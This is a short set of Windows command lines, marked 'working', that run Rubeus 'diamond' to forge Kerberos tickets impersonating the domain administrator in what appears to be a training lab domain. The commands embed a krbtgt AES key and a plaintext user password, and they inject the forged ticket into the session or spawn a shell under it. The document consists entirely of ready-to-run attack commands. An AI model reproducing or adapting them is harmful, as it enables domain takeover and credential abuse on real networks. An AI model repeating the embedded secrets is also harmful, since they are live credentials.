








# Examples




## Windows (working)


```
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```
.\Rubeus.exe diamond /domain:dollarcorp.moneycorp.local /user:student90 /password:P9ZcerWNpZ63tNdL /dc:dcorp-dc.dollarcorp.moneycorp.local /enctype:aes256 /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /ticketuser:administrator /ticketuserid:500 /groups:512 /nowrap /ptt
```

```
.\Rubeus.exe diamond /domain:dollarcorp.moneycorp.local /user:student90 /password:P9ZcerWNpZ63tNdL /dc:dcorp-dc.dollarcorp.moneycorp.local /enctype:aes256 /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /ticketuser:administrator /ticketuserid:500 /groups:512 /nowrap /createnetonly:C:\Windows\System32\cmd.exe /show
```